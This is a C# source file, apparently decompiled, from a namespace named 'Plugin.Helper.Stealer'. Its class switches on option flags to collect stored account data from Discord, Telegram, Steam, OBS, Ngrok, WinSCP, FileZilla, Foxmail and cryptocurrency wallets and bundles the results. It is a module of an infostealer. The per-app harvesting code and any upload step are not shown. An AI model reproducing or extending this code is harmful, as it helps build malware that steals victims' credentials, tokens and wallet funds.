

using InvokedCommon.Structs;


namespace Plugin.Helper.Stealer
{
	internal class Apps
	{
		public static AppsData GetAllInfo(AppsOptions options)
		{
			int num = (options & AppsOptions.Discord) == AppsOptions.Discord ? 1 : 0;
			bool flag1 = (options & AppsOptions.Telegram) == AppsOptions.Telegram;
			bool flag2 = (options & AppsOptions.Steam) == AppsOptions.Steam;
			bool flag3 = (options & AppsOptions.Obs) == AppsOptions.Obs;
			bool flag4 = (options & AppsOptions.Ngrok) == AppsOptions.Ngrok;
			bool flag5 = (options & AppsOptions.Winscp) == AppsOptions.Winscp;
			bool flag6 = (options & AppsOptions.Filazilla) == AppsOptions.Filazilla;
			bool flag7 = (options & AppsOptions.Foxmail) == AppsOptions.Foxmail;
			bool flag8 = (options & AppsOptions.Crypto) == AppsOptions.Crypto;
			DiscordUserData[] _DiscordUserDatas = (DiscordUserData[]) null;
			TelegramInfo? _telegramInfo = new TelegramInfo?(new TelegramInfo());
			SteamInfo? _steamInfos = new SteamInfo?(new SteamInfo());
			OBSInfo[] _obsInfos = (OBSInfo[]) null;
			NgrokInfo? _ngrokInfos = new NgrokInfo?(new NgrokInfo());
			WinScpInfo[] _winscpInfos = (WinScpInfo[]) null;
			FileZillaInfo[] _filezillaInfos = (FileZillaInfo[]) null;
			FoxMailInfo[] _foxMailInfos = (FoxMailInfo[]) null;
			CryptoInfo[] _cryptoInfos = (CryptoInfo[]) null;
			if (num != 0)
				_DiscordUserDatas = Discord.GetInfo();
			if (flag1)
				_telegramInfo = Telegram.GetInfo();
			if (flag2)
				_steamInfos = Steam.GetInfo();
			if (flag3)
				_obsInfos = OBS.GetInfo();
			if (flag4)
				_ngrokInfos = Ngrok.GetInfo();
			if (flag5)
				_winscpInfos = WinScp.GetInfo();
			if (flag6)
				_filezillaInfos = FileZilla.GetInfo();
			if (flag7)
				_foxMailInfos = FoxMail.GetInfo();
			if (flag8)
				_cryptoInfos = Crypto.GetInfo();
			return new AppsData(options, _DiscordUserDatas, _telegramInfo, _steamInfos, _obsInfos, _ngrokInfos, _winscpInfos, _filezillaInfos, _foxMailInfos, _cryptoInfos);
		}
	}
}
